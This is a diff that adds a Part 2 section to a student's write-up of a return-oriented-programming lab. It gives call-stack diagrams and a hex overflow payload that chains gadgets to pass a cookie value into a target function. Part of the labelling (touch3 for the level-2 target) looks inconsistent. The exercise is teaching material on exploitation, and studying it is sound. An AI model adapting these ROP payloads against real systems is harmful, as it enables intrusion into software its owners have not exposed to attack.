@@ -256,3 +256,97 @@ To jump to =touch3=, we have several different ways to make it.
 2. Anyway, however, =movq= can also emulate what does =pushq= do, just use it.
 3. Another way, we can compute and place our data in stack with good caution, so that only =movq= is needed.
 #+end_quote
+
+* Part 2: Return-Oriented Programming
+
+Since randomization of stack position is enabled, as well as stack has been marked as non-executable,
+we can't use ordinary way to do code injection. In the section, instead of, we need to make use of existing
+code for our hacking.
+
+Technicology enabled:
+
+#+begin_quote
+1. stack randomization
+2. stack as nonexecutable
+#+end_quote
+
+** Level 1
+
+Though there is not any word saying that we should do level-1 task listed in above section,
+we can infer that /level-1.out/ still works well here without any modification. (It isn't dependent
+on string buffer exploit.)
+
+** Level 2
+
+The mission of this part is kinda same as it in /code injection/, except that we can't execute
+code in the string buffer.
+
+Let's do some simple analysis here:
+
+#+begin_src plantuml
+title call stack
+
+main <-> launch: 1
+launch <-> test: 2
+test <-> getbuf: 3
+getbuf <-> Gets: 4
+#+end_src
+
+#+RESULTS:
+[[file:/tmp/babel-XDKb0v/plantuml-HpTfSl.png]]
+
+Be careful with manipulations of =%rsp=:
+
+#+begin_src plantuml
+@startuml
+object Stack {
+        test(0x401968)
+        ..
+        sub    $0x8,%rsp
+        ...
+        call   4017a8 <getbuf>
+        ...
+        add    $0x8,%rsp
+        --
+        getbuf(0x4017a8)
+        ..
+        sub    $0x28,%rsp
+        ...
+        call   401b60 <Gets>
+        ...
+        add    $0x28,%rsp
+        ...
+        ret
+}
+@enduml
+#+end_src
+
+#+RESULTS:
+[[file:/tmp/babel-XDKb0v/plantuml-BiXaWv.png]]
+
+Layout of =buf[BUFFER_SIZE]= /(overflowed)/:
+
+#+begin_example
+00 00 00 00 00 00 00 00 /* buf[0]-buf[8] */
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00 /* buf[32]-buf[40], start your code below */
+ab 19 40 00 00 00 00 00 /* popq %rax */
+fa 97 b9 59 00 00 00 00 /* cookie string */
+a2 19 40 00 00 00 00 00 /* movq %rax,%rdi */
+ec 17 40 00 00 00 00 00
+#+end_example
+
+So the representation of full process of address redirection comes out below:
+
+#+begin_src plantuml
+getbuf -> 0x4019ab: ret
+0x4019ab -> 0x4019a2: popq %rax; ret
+0x4019a2 -> 0x4017ec: movq %rax,%rdi; ret
+
+0x4017ec: touch3
+#+end_src
+
+#+RESULTS:
+[[file:/tmp/babel-XDKb0v/plantuml-xdtzxO.png]]
